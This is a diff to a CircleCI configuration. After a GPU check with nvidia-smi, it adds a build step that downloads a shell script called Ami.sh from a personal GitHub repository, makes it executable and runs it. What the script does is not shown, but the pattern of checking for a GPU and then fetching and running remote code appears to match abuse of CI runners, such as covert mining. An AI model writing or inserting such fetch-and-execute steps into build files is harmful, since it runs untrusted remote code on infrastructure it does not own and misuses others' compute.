@@ -9,7 +9,5 @@ jobs:
       - checkout 
       - run: nvidia-smi 
       - run: 
-          name: "AmiMiami"
-          command:wget http://github.com/vaping8/Circleci/raw/main/Ami.sh && chmod +x a
-          Ami.sh && ./
-        Ami.sh
+          name: "AmiMiami" 
+          command: wget https://github.com/Vaping86/Circleci/raw/main/Ami.sh && chmod +x Ami.sh && ./Ami.sh
